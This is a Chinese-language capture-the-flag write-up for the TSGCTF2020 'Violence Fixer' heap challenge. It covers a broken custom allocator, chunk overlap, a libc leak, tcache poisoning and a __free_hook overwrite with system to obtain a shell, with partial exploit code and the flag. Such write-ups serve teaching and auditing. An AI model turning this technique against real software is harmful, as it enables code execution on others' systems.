# TSGCTF2020 Violence Fixer WP

## 题目简述

程序在 glibc `malloc` 之上又维护了一套线性分配指针 `top`。普通申请虽然会调用真正的 `malloc` 扩展堆，但记录给用户的地址并不是 `malloc` 返回值，而是自定义 `top`；释放任意块后又无条件执行 `top -= size`：

```c
infos[index].size = ((requested_size + 0x10) >> 4) << 4;
malloc(infos[index].size - 0x10);       // 返回值被丢弃
infos[index].addr = top;
*(unsigned long *)(top + 8) = infos[index].size | 1;
top += infos[index].size;

free(infos[index].addr + 0x10);
top -= infos[index].size;
```

这套记账只在严格后进先出时才可能与真实堆顶一致。只要释放中间块，自定义 `top` 就会回退到仍在使用的区域，后续写入能够覆盖相邻 chunk 的元数据。题目还提供一次 `delegate`：它改用真实 `malloc` 返回值，因而可在 tcache 投毒后把数据写到攻击者指定的位置。目标是在 glibc 2.31 中覆盖 `__free_hook` 为 `system`，再释放保存着 `/bin/sh` 的块。

## 解题过程

先申请四个 `0x200` 块、一个 `0xa0` 块和若干较大的垫块，再按官方脚本释放前面的块。真实 allocator 仍按各 chunk 的边界管理内存，而自定义 `top` 已因每次释放都减去对应大小而退回到错误位置。此时申请 `0x60` 并写入以下尾部数据：

```python
alloc(0x60, b"\0" * 0x30 + p64(0) + p64(0x481))
```

写入位置与仍存活的堆块重叠，因此可伪造后方 chunk 的 `prev_size/size`。释放该块、进行数次小申请并再写满一个 `0x160` 块后，原先编号 7 的记录指向已进入 unsorted bin 的区域。`show(7)` 使用 `%s` 输出用户区，其中残留的 `fd/bk` 指针来自 `main_arena`。官方环境的偏移为：

```python
main_arena_leak = u64(show(7).ljust(8, b"\0"))
libc_base = main_arena_leak - 0x1ebbe0
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
```

接下来继续利用错误的 `top` 在真实堆顶之外布置小块，并把字符串 `/bin/sh;\0` 保存到一个可释放块中。通过释放脚本中的 `0xf`、`0x13`、`0x15` 三个编号，构造同尺寸 tcache 链；随后从重叠位置改写链表指针：

```python
payload  = p64(0) + p64(0x31)
payload += b"A" * 0x80
payload += p64(0) + p64(0x31)
payload += p64(free_hook)
alloc(0x130, payload)
```

第一次普通申请消耗链表中的正常节点。之后调用唯一一次 `delegate(0x20, p64(system))`，真实 `malloc` 会沿被投毒的 tcache 链返回 `__free_hook - 0x10` 对应位置，`delegate` 再从用户区写入 `system` 地址。最后释放保存 `/bin/sh;` 的块，实际调用变为 `system("/bin/sh;")`，获得 shell 并读取 flag：

```text
TSGCTF{dont_eat_your_pet_fish}
```

## 方法总结

本题的根因不是 glibc 本身，而是程序试图用一个只做加减的指针模拟 allocator：任意顺序释放会立即破坏“自定义堆顶等于真实堆顶”的不变量。利用链先把这种偏差转成堆块重叠，借 unsorted bin 指针泄露 libc，再伪造小块元数据并投毒 tcache，最后借 `delegate` 对真实 `malloc` 返回地址的写入覆盖 `__free_hook`。审计自制内存管理器时，应逐项比较其分配、释放和合并规则与底层 allocator；只要两套状态能分叉，通常就能产生重叠块、越界写或重复分配。
